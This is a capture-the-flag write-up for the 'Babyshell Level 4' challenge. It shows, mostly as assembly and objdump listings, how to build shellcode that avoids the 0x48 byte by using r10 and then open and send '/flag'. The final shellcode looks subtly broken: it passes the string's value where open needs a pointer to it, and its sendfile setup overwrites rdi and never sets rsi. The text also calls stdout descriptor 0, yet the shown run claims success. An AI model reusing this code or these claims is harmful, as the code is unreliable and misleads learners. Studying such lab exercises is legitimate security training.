# Babyshell Level 4
This challenge was a bit like the last one, but this time the filter checks for the byte 0x48, so we need to test different registers to see which cause the opcode 0x48 and which register doesn't.

## Solving The Challenge
So we are going to start looking at every restriction on the current instruction in our program, since the challenge is pretty much the same we can just take the same shellcode we used in the precedent level and objdump it, this way we can see where our shellcode can potentially fail and which instructions we need to fix.

Also you can use the pwn.asm() functions instead of compiling the code and checking with objdump.

Those are the following restrictions on instructions i've had to deal with during the course of this challenge :

mov rdi, rsp - can't be used since it has a 0x48 in it's opcode
shl rbx, 8   - can't be used since it has a 0x48 in it's opcode

I've made a program that does shl, shr, rol, ror, sar, sal. Note how each of these instructions starts with the opcode 0x48, which we need to evade... this means we won't be able to use these instructions, also note that the instruction **sal** was translated to **shl** during compilation of the program :
```x86asm
Disassembly of section .text:

0000000000401000 <_start>:
401000:       48 c1 e3 08             shl    rbx,0x8
401004:       48 c1 e0 08             shl    rax,0x8
401008:       48 c1 e2 08             shl    rdx,0x8
40100c:       48 c1 e6 08             shl    rsi,0x8
401010:       48 c1 e7 08             shl    rdi,0x8
401014:       48 c1 c3 08             rol    rbx,0x8
401018:       48 c1 c0 08             rol    rax,0x8
40101c:       48 c1 c2 08             rol    rdx,0x8
401020:       48 c1 c6 08             rol    rsi,0x8
401024:       48 c1 c7 08             rol    rdi,0x8
401028:       48 c1 eb 08             shr    rbx,0x8
40102c:       48 c1 e8 08             shr    rax,0x8
401030:       48 c1 ea 08             shr    rdx,0x8
401034:       48 c1 ee 08             shr    rsi,0x8
401038:       48 c1 ef 08             shr    rdi,0x8
40103c:       48 c1 e3 08             shl    rbx,0x8
401040:       48 c1 e0 08             shl    rax,0x8
401044:       48 c1 e2 08             shl    rdx,0x8
401048:       48 c1 e6 08             shl    rsi,0x8
40104c:       48 c1 e7 08             shl    rdi,0x8
401050:       48 c1 cb 08             ror    rbx,0x8 
401054:       48 c1 c8 08             ror    rax,0x8
401058:       48 c1 ca 08             ror    rdx,0x8
40105c:       48 c1 ce 08             ror    rsi,0x8
401060:       48 c1 cf 08             ror    rdi,0x8
401064:       48 c1 fb 08             sar    rbx,0x8
401068:       48 c1 f8 08             sar    rax,0x8
40106c:       48 c1 fa 08             sar    rdx,0x8
401070:       48 c1 ff 08             sar    rdi,0x8
401074:       48 c1 fe 08             sar    rsi,0x8
401078:       48 c1 e3 08             shl    rbx,0x8
40107c:       48 c1 e0 08             shl    rax,0x8
401080:       48 c1 e2 08             shl    rdx,0x8
401084:       48 c1 e7 08             shl    rdi,0x8
401088:       48 c1 e6 08             shl    rsi,0x8
```

We can conclude that we can't use bit shifting (shl, shr), bit rotating (ror, rol) or bit arithmetic shifting (sal, sar)

Next i've noticed some 0x48 bytes in the opcode of the "**mov rdi, rsp**" instruction... for this reason we are going to try to move every register possible inside rdi, to achieve this i wrote the following program (note how we were able to evade the filter using the r10 register) :
```x86asm
Disassembly of section .text:

0000000000401000 <_start>:
401000:       48 c7 c0 01 00 00 00    mov    rax,0x1
401007:       48 89 c7                mov    rdi,rax
40100a:       48 89 c6                mov    rsi,rax
40100d:       48 89 f7                mov    rdi,rsi
401010:       48 89 c3                mov    rbx,rax
401013:       48 89 df                mov    rdi,rbx
401016:       48 89 c2                mov    rdx,rax
401019:       48 89 d7                mov    rdi,rdx
40101c:       49 89 c2                mov    r10,rax
40101f:       4c 89 d7                mov    rdi,r10
401022:       50                      push   rax
401023:       48 89 e7                mov    rdi,rsp
401026:       48 31 ff                xor    rdi,rdi
401029:       48 31 c0                xor    rax,rax
40102c:       48 31 f6                xor    rsi,rsi
40102f:       4d 31 d2                xor    r10,r10
401032:       48 31 db                xor    rbx,rbx
401035:       48 31 d2                xor    rdx,rdx
401038:       48 c7 c0 3c 00 00 00    mov    rax,0x3c
40103f:       48 c7 c7 2a 00 00 00    mov    rdi,0x2a
401046:       0f 05                   syscall
```

Notice that the **xor instruction** has the byte 0x48 in his opcode, for this reason we are going to need to avoid using the **xor instruction**.

So after noticing that i could bypass the filter using r10 register, i asked myself if i could use either a **shr, shl, ror, rol, sar, sal** instruction on the r10 register to bypass the filter :
```x86asm
40108c:       49 c1 e2 08             shl    r10,0x8
401090:       49 c1 ea 08             shr    r10,0x8
401094:       49 c1 e2 08             shl    r10,0x8
401098:       49 c1 fa 08             sar    r10,0x8
40109c:       49 c1 ca 08             ror    r10,0x8
4010a0:       49 c1 c2 08             rol    r10,0x8
```

As you can notice it turns out that the r10 register does indeed bypass the filter, ALL HAIL R10 !!!! :)

So we can start writing the first part of our shellcode which is opening a file descriptor on the "/flag" file, in our case we won't be able to use rbx for our bit shifting like the last challenge since we can't shift rbx without causing a 0x48 opcode, which will make us fail the challenge.

For this reason i have used r10 in my code !

Other problem i ran into, **rsi/rdx** were set to some random values when i executed my shellcode so i'm going to need to clear them out, but i can't use **xor rsi,rdi** or **xor rdx, rdx**... in this case i will do **xor r10, r10** and then move r10 into rdx and rsi.

Next problem i ran into while trying to solve this challenge is that you can't directly move 0x2 into rax without having a 0x48 opcode, for this reason i am going to put 0x2 in the lower 8 bits of r10 (**r10b**) and do a **mov al, r10b**.

With all these problem fixed our open syscall should be able to bypass the filter imposed, let's write the first partof our shellcode :
```x86asm
.global _start
_start:
.intel_syntax noprefix
    
    # Open a file descriptor on the "/flag" file
    mov r10d, 0x67616c66
    shl r10, 8
    mov r10b, 0x2f
    push r10
    pop r10
    mov rdi, r10
    xor r10, r10
    mov rsi, r10
    mov rdx, r10
    mov r10b, 0x2
    mov al, r10b
    syscall
```

Next step would be to use our sendfile instruction to read the file and send it out to the standard output file descriptor (0)...

We can pretty much rewrite the same as we did for the last challenge and it should work,... let's do that :
```x86asm
.global _start
_start:
.intel_syntax noprefix
    
    # Open a file descriptor on the "/flag" file
    mov r10d, 0x67616c66
    shl r10, 8
    mov r10b, 0x2f
    push r10
    pop r10
    mov rdi, r10
    xor r10, r10
    mov rsi, r10
    mov rdx, r10
    mov r10b, 0x2
    mov al, r10b
    syscall

    # Read a the file we just opened and send it to stdout
    push 1
    pop rdi
    push rax
    pop rdi
    push 100
    pop r10
    push 40
    pop rax
    syscall

    push 60
    pop rax
    push 42
    pop rdi
    syscall
```

Now you can just compile it, extract the bytes from the **.text** section and we should win the challenge ! Let's prove that it works :
```
$ gcc -w -nostdlib -static shellcode.s -o shellcode -masm=intel
$ objcopy --dump-section .text=solver shellcode
$ ./babyshell_level4 <solver
flag{fake_flag_for_testing}
```

Annnnnd we did bypass the filter, it was pretty easy and nice to solve, if you had problems doing it on your own remember you can write programs to test instructions and dump their opcode using the objdump -D switch. :)
